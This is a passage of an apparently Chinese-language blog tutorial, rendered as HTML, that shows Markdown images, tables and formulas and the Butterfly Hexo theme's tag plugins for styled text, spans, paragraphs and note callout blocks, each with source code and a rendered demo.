id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用note">2.4 引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary 